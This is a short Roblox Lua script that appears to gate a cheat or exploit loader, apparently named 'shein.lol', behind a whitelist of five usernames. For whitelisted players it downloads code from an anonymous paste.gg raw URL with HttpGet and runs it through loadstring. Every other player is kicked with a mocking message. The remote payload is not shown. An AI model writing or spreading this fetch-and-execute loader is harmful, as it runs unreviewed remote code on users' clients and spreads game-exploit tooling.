-- @owo updated whitelist

local WhitelistedUsernames = {
    ["27k_gaming"] = true,
    ["torsotapper"] = true,
    ["twinthedev"] = true,
    ["cayyhaunt"] = true,
    ["Dragonblox836"] = true
    
}

local Player = game.Players.LocalPlayer

local function isWhitelisted(player)
    local username = player.Name
    return WhitelistedUsernames[username] == true
end

if isWhitelisted(Player) then
    loadstring(game:HttpGet("https://paste.gg/p/anonymous/ec746110a98147efaefe0dd955e38264/files/65275454bab040e7a396cb4f19ca31f9/raw"))()
else
    game.Players.LocalPlayer:Kick("BlackListed - shein.lol DOESNT like u😂.")
end
